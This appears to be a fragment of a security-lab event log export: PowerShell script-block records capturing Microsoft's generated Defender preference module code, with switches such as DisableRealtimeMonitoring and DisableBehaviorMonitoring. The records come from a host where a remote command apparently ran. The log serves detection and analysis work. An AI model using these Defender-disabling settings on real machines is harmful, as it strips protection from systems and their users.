          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {
          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {
          [object]$__cmdletization_value = ${MAPSReporting}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {
          [object]$__cmdletization_value = ${SubmitSamplesConsent}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {
          [object]$__cmdletization_value = ${DisableAutoExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {
          [object]$__cmdletization_value = ${DisablePrivacyMode}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {
          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {
          [object]$__cmdletization_value = ${SchedulerRandomizationTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {
          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {
          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {
          [object]$__cmdletization_value = ${DisableIOAVProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {
          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {
          [object]$__cmdletization_value = ${DisableScriptScanning}
          $__cmdle",5,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3334,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",ZHkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.203",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (6 of 20):
tization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {
          [object]$__cmdletization_value = ${DisableArchiveScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {
          [object]$__cmdletization_value = ${DisableCatchupFullScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {
          [object]$__cmdletization_value = ${DisableCatchupQuickScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {
          [object]$__cmdletization_value = ${DisableEmailScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {
          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {
          [object]$__cmdletization_value = ${DisableRestorePoint}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {
          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {
          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UILockdown')) {
          [object]$__cmdletization_value = ${UILockdown}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {
          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {
          [object]$__cmdletization_value = ${LowThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {
          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletizat

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","tization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {
          [object]$__cmdletization_value = ${DisableArchiveScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {
          [object]$__cmdletization_value = ${DisableCatchupFullScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {
          [object]$__cmdletization_value = ${DisableCatchupQuickScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {
          [object]$__cmdletization_value = ${DisableEmailScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {
          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {
          [object]$__cmdletization_value = ${DisableRestorePoint}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {
          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
